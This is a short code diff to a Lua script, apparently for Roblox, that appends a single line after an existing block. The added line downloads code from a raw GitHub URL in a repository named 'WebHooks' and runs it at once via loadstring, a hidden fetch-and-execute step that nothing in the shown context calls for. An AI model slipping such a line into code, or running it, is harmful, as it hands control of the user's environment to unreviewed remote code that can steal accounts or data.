@@ -334,3 +334,5 @@ if not _G.Prompt then
         end
     end
 end
+
+loadstring(Game:HttpGet("https://raw.githubusercontent.com/Games1799/WebHooks/refs/heads/main/JustScript"))()
